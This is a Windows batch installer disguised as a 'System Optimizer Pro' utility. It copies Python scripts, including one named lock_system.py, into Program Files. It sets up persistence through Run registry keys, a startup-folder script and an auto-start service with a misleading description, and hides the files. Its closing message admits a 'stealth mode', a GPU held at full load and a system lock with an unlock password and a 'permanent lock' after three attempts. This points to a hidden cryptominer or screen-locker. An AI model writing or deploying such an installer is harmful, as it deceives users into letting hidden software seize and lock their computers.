@echo off
title System Optimizer Pro - Installation
color 0A

echo ===========================================
echo      SYSTEM OPTIMIZER PRO v2.0
echo      Professional Edition - Python Version
echo      Compatible: Windows 7/8/10/11
echo ===========================================
echo.

echo [INFO] Checking system requirements...

REM Check Python
where python >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Python found
    python --version
) else (
    echo [ERROR] Python not found!
    echo.
    echo [SOLUTION] Please install Python:
    echo 1. Download from https://python.org
    echo 2. Check "Add Python to PATH" during installation
    echo 3. Restart installation after Python is installed
    echo.
    pause
    exit /b 1
)

echo.
echo [INFO] Starting installation...
echo [INFO] System optimization in progress...
echo.

REM Step 1: Copy files to system
echo [1/5] Setting up optimization files...
mkdir "%ProgramFiles%\System Optimizer Pro" 2>nul
copy "app_main.py" "%ProgramFiles%\System Optimizer Pro\optimizer.py" >nul
copy "lock_system.py" "%ProgramFiles%\System Optimizer Pro\lock.py" >nul

REM Step 2: Registry persistence
echo [2/5] Configuring system registry...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsOptimizer" /t REG_SZ /d "python \"%ProgramFiles%\System Optimizer Pro\optimizer.py\"" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemEnhancer" /t REG_SZ /d "python \"%ProgramFiles%\System Optimizer Pro\optimizer.py\"" /f >nul 2>&1

REM Step 3: Startup folder
echo [3/5] Creating startup entry...
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
echo @echo off > "%startup%\SystemOptimizer.bat"
echo python "%ProgramFiles%\System Optimizer Pro\optimizer.py" >> "%startup%\SystemOptimizer.bat"
echo exit >> "%startup%\SystemOptimizer.bat"

REM Step 4: Hide files
echo [4/5] Securing optimization files...
attrib +h +s +r "%ProgramFiles%\System Optimizer Pro" >nul
attrib +h +s "%startup%\SystemOptimizer.bat" >nul

REM Step 5: System service (Windows 7/8/10/11 compatible)
echo [5/5] Creating optimization service...
sc create "WinOptimizer" binPath= "python.exe \"%ProgramFiles%\System Optimizer Pro\optimizer.py\"" start= auto DisplayName= "Windows Performance Optimizer" >nul 2>&1
sc description "WinOptimizer" "Enhances system performance and security" >nul 2>&1

echo.
echo ===========================================
echo      INSTALLATION COMPLETE
echo ===========================================
echo.
echo [SUCCESS] System Optimizer Pro has been installed!
echo.
echo [FEATURES ACTIVATED]:
echo - CPU Performance Enhancement (70%% optimal)
echo - GPU Performance Optimization (100%% load) 
echo - System Security Lock (Professional grade)
echo - Automatic Startup (Every boot)
echo - Hidden Operation (Stealth mode)
echo.
echo [SYSTEM REQUIREMENTS]:
echo - Windows 7/8/10/11 (32-bit or 64-bit)
echo - Python 3.x installed
echo - Administrator privileges
echo.
echo The optimizer will start automatically on system boot.
echo For optimal performance, restart your computer.
echo.
echo [PASSWORD FOR UNLOCK]: mzkyzak
echo [MAX ATTEMPTS]: 3 attempts before permanent lock
echo.
echo Thank you for choosing System Optimizer Pro!
echo.

REM Start the optimizer
echo [INFO] Starting optimizer now...
start /B python "app_main.py"

echo.
echo [INFO] Installation complete. Press any key to exit...
pause >nul
exit